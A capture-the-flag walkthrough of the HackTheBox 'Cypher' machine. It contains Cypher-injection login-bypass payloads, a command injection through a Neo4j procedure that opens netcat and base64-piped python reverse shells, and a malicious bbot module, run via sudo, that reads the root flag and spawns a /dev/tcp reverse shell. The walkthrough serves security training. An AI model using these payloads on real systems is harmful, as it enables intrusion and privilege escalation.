---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Cypher
Linux machine

## Foothold

```bash
nmap -sC -sV -vv 10.10.11.57
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

update `/etc/hosts` with cypher.htb.

```bash
ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://cypher.htb/FUZZ
```

```
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 35ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 36ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 29ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 32ms]
:: Progress: [3024/3024] :: Job [1/1] :: 1149 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```

Go to <http://cypher.htb/testing/> and dowload the jar file.

We want to decompile it. Google search `java decompile`, we get <http://java-decompiler.github.io/>. Download it and run:

```bash
java -jar Downloads/jd-gui-1.6.6.jar
```

Open the downloaded custom-apoc-extension-1.0-SNAPSHOT.jar. We see neo4j is being used. And precisely the version 5.23.0.

[What is APOC](https://neo4j.com/labs/apoc/5/installation/).

If we go to the login page source code we see that the request is sent to `/api/auth` and the following script:
```html
  <script>
    // TODO: don't store user accounts in neo4j
    function doLogin(e) {
      e.preventDefault();
      var username = $("#usernamefield").val();
      var password = $("#passwordfield").val();
      $.ajax({
        url: '/api/auth',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ username: username, password: password }),
        success: function (r) {
          window.location.replace("/demo");
        },
        error: function (r) {
          if (r.status == 401) {
            notify("Access denied");
          } else {
            notify(r.responseText);
          }
        }
      });
    }

    $("form").keypress(function (e) {
      if (e.keyCode == 13) {
        doLogin(e);
      }
    })

    $("#loginsubmit").click(doLogin);
  </script>
```

Now, thanks to the script we downloaded and the page we know it's using neo4j and apoc 5.23.0.

[Here](https://neo4j.com/developer/kb/protecting-against-cypher-injection/#_parameters_and_apoc) is a guide on how to protect yourself from cypher injection (heh).

[Cypher cheat sheet](https://neo4j.com/docs/cypher-cheat-sheet/5/all/)

Let's try `' MATCH (all) DETACH; //` as username and password. We get the following traceback:
```
Traceback (most recent call last): File "/app/app.py", line 142, in verify_creds results = run_cypher(cypher) File "/app/app.py", line 63, in run_cypher return [r.data() for r in session.run(cypher)] File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run self._auto_result._run( File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run self._attach() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach self._connection.fetch_message() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner func(*args, **kwargs) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message res = self._process_message(tag, fields) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message response.on_failure(summary_metadata or {}) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Invalid input ';': expected 'DELETE' (line 1, column 74 (offset: 73)) "MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' MATCH (all) DETACH; //' return h.value as hash" ^} During handling of the above exception, another exception occurred: Traceback (most recent call last): File "/app/app.py", line 165, in login creds_valid = verify_creds(username, password) File "/app/app.py", line 151, in verify_creds raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}") ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' MATCH (all) DETACH; //' return h.value as hash: Traceback (most recent call last): File "/app/app.py", line 142, in verify_creds results = run_cypher(cypher) File "/app/app.py", line 63, in run_cypher return [r.data() for r in session.run(cypher)] File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run self._auto_result._run( File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run self._attach() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach self._connection.fetch_message() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner func(*args, **kwargs) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message res = self._process_message(tag, fields) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message response.on_failure(summary_metadata or {}) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Invalid input ';': expected 'DELETE' (line 1, column 74 (offset: 73)) "MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' MATCH (all) DETACH; //' return h.value as hash" ^} 
```

From the error we can see the query that is used. We can also see that the app uses SHA1 for passwords.

This probably selects the first user:
```
' OR u.name IS :: STRING return h.value as hash //
```

We get the following error about not having the correct password:

```
Traceback (most recent call last): File "/app/app.py", line 144, in verify_creds db_hash = results[0]["hash"] KeyError: 'hash' During handling of the above exception, another exception occurred: Traceback (most recent call last): File "/app/app.py", line 165, in login creds_valid = verify_creds(username, password) File "/app/app.py", line 151, in verify_creds raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}") ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' OR u.name IS :: STRING return h.value //' return h.value as hash: Traceback (most recent call last): File "/app/app.py", line 144, in verify_creds db_hash = results[0]["hash"] KeyError: 'hash' 
```

Let's try to return a SHA1 hash of the letter `a` (use page http://www.sha1-online.com for example). Use the following as the username and letter `a` as the password:
```
' OR u.name IS :: STRING return '86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' as hash //
```

And we are in!

Now on the demo page, there is option to make more queries, let's try to paste an `'` apostrophe. We get the following error:
```
Traceback (most recent call last): File "/app/app.py", line 184, in get_nodes return run_cypher(query) File "/app/app.py", line 63, in run_cypher return [r.data() for r in session.run(cypher)] File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run self._auto_result._run( File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run self._attach() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach self._connection.fetch_message() File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner func(*args, **kwargs) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message res = self._process_message(tag, fields) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message response.on_failure(summary_metadata or {}) File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure raise Neo4jError.hydrate(**metadata) neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 1 (offset: 0)) "'" ^} 
```

We can see it takes any input and executes it.

Let's modify the query from the login page with the info we got from the first error:
```
MATCH (u:USER) -[:SECRET]-> (h:SHA1) return *
```

We get:
```json
[
  {
    "h": {
      "value": "9f54ca4c130be6d529a56dee59dc2b2090e43acf"
    },
    "u": {
      "name": "graphasm"
    }
  }
]
```

Let's try to enumerate the databases:
```
SHOW DATABASES
```
```
[
  {
    "name": "neo4j",
    "type": "standard",
    "aliases": [],
    "access": "read-only",
    "address": "localhost:7687",
    "role": "primary",
    "writer": true,
    "requestedStatus": "online",
    "currentStatus": "online",
    "statusMessage": "",
    "default": true,
    "home": true,
    "constituents": []
  },
  {
    "name": "system",
    "type": "system",
    "aliases": [],
    "access": "read-write",
    "address": "localhost:7687",
    "role": "primary",
    "writer": true,
    "requestedStatus": "online",
    "currentStatus": "online",
    "statusMessage": "",
    "default": false,
    "home": false,
    "constituents": []
  }
]
```

## User

Still nothing.. aha! Remember the file we downloaded? It had custom procedures ~~and functions~~:
```
SHOW PROCEDURES WHERE name STARTS WITH 'custom'
```
```
[
  {
    "name": "custom.getUrlStatusCode",
    "description": "Returns the HTTP status code for the given URL as a string",
    "mode": "READ",
    "worksOnSystem": false
  },
  {
    "name": "custom.helloWorld",
    "description": "A simple hello world procedure",
    "mode": "READ",
    "worksOnSystem": false
  }
]
```

Try the hello world procedure:
```
CALL custom.helloWorld('asd')
```
```
[
  {
    "greeting": "Hello, asd!"
  }
]
```

Now let's try the second procedure:
```
CALL custom.getUrlStatusCode('http://10.10.14.14:8000')
```

According to the source code, let's try the following:
```
CALL custom.getUrlStatusCode("http://10.10.14.14:8000; nc 10.10.14.14 1234")
```
There is a problem with netcat and special characters, let's try python shell:
```
CALL custom.getUrlStatusCode("http://10.10.14.14:8000; which python3")
```
Once the shell handler is running:
```bash
python3 tcp_pty_shell_handler.py -b 0.0.0.0:1111
```
We can start the revese shell:
```
CALL custom.getUrlStatusCode("http://10.10.14.14:8000; echo <backconnect.py in base64> | base64 -d | python3")
```
We are the `neo4j` user. Let's try to enumerate:

```bash
cat /etc/passwd
```

We see the user `graphasm`. Let's check his home directory:
```bash
ls /home/graphasm/ -al
```

There is an unusual file `bbot_preset.yml`. We got a password `cU4btyib.20xtCMCXkBmerhK`. doesn't work for neo4j, but it works for the `graphasm` user!

Let's SSH in `ssh graphasm@cypher.htb`.

## Root

Check for sudo privileges with `sudo -l`:
```
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

`sudo /usr/local/bin/bbot --help` -> `BIGHUGE BLS OSINT TOOL v2.1.0.4939rc`.

Soooooo... this thing is modular and uses modules. Let's check the [documentation](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) for it. We see we can create new modules and import them. This is it!

Let's create a directory in tmp:
```bash
mkdir /tmp/.sad
cd /tmp/.sad
```

This will be `/tmp/.sad/whois.py`.
```python
from subprocess import run
from bbot.modules.base import BaseModule

class whois(BaseModule):

    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        a = run("cat /root/root.txt", capture_output=True, shell=True)
        print(a.stdout)
        return False

    async def handle_event(self, event):
        pass

```

??? tip "Root shell"

    Run listener on the attacker:
    ```bash
    nc -lvnp 1234
    ```
    
    Update the module payload:
    ```python
    from subprocess import Popen
    from bbot.modules.base import BaseModule
    
    class whois(BaseModule):
    
        # one-time setup - runs at the beginning of the scan
        async def setup(self):
            Popen("/bin/bash -c 'bash -i > /dev/tcp/<ATTACKER_IP>/1234 0>&1'", shell=True)
            return False
    
        async def handle_event(self, event):
            pass
    
    ```
    
    Upgrade the shell with (run it inside it):
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    More shell upgrades [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

From the [docs](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/#load-modules-from-custom-locations) we can see we can set configuration in the preset, so let's create one.
`/tmp/.sad/conf.yml`:
```yaml
module_dirs:
  - /tmp/.sad
```

Now let's run it:
```bash
sudo bbot -p /tmp/.sad/conf.yml -m whois
```

Flag is in the output.
